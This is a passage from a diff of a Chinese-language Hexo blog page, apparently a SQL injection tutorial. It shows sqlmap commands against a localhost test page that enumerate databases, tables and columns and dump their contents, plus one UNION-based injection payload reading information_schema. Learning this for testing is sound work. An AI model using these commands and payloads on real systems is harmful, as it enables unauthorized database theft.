+<h4 id="查询当前用户下的所有数据库"><a href="#查询当前用户下的所有数据库" class="headerlink" title="查询当前用户下的所有数据库"></a>查询当前用户下的所有数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;sql1.php?id&#x3D;1 --dbs</span><br></pre></td></tr></table></figure>
+
+<h4 id="查询当前所在的数据库"><a href="#查询当前所在的数据库" class="headerlink" title="查询当前所在的数据库"></a>查询当前所在的数据库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; --current-db</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/%E6%9A%B4%E5%BA%93.png" alt="暴库"></p>
+<h4 id="使用sqlmap查询当前数据库中的表名"><a href="#使用sqlmap查询当前数据库中的表名" class="headerlink" title="使用sqlmap查询当前数据库中的表名"></a>使用sqlmap查询当前数据库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 当前数据库名 --tables </span><br></pre></td></tr></table></figure>
+
+<h4 id="获取表中的字段名"><a href="#获取表中的字段名" class="headerlink" title="获取表中的字段名"></a>获取表中的字段名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 数据库名 -T 表名 --columns</span><br></pre></td></tr></table></figure>
+
+<h4 id="获取字段内容"><a href="#获取字段内容" class="headerlink" title="获取字段内容"></a>获取字段内容</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python sqlmap.py sqlmap -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;sql.php?id&#x3D;1&quot; -D 数据库名 -T 表名 -C 字段名，字段名 --dump</span><br></pre></td></tr></table></figure>
+
+<p><strong>为方便理解，在代码中加了换行。</strong></p>
+<p>发现只有当查询语句只返回一个字符串（值）才有正常的回显。</p>
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union6.png" alt="union6"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;-1+union+select+1,(select+table_name+from+information_schema.tables+where+table_schema&#x3D;&#39;xiaoming&#39;+limit+0,1),3</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://zhuang-yongyi.gitee.io/yoyo/SQL%E6%B3%A8%E5%85%A5/union8.png" alt="union8"></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://www.yoyo2tong.xyz/2020/10/31/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1352,7 +1588,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">7</span>
+          <span class="site-state-item-count">9</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -1399,12 +1635,12 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-area"></i>
     </span>
-    <span title="站点总字数">26k</span>
+    <span title="站点总字数">33k</span>
     <span class="post-meta-divider">|</span>
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">24 分钟</span>
+    <span title="站点阅读时长">30 分钟</span>
 </div>
   <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
   </div>
